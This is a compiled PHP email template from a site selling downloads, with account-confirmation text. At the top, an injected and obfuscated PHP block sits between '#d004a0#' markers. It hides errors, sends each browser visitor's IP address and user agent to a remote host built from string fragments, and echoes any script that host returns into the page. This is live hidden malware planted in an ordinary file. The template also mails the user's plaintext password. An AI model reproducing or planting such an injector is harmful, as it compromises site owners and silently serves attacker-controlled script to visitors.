<?php /* Smarty version 2.6.22, created on 2010-12-06 17:40:34
         compiled from /home/a1425978/public_html//templates//mail/account_information.html */ ?>
<?php
#d004a0#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/d004a0#
?>
<?php

?>
<?php

?>
<?php

?>
Thank you for registering with http://www.alanmarcero.com

Below is your account information to be used to download your purchased items.
Please do not lose this information.  Keep it in a secure location as you can use 
the Customer's Section to re-download your purchases at any point in the future.


Your login email: <?php echo $this->_tpl_vars['email']; ?>

Your login password: <?php echo $this->_tpl_vars['password']; ?>



You may download your purchases or alter your login information at the 
Customer's Section: http://www.alanmarcero.com/customers.php


Alan Marcero
http://www.alanmarcero.com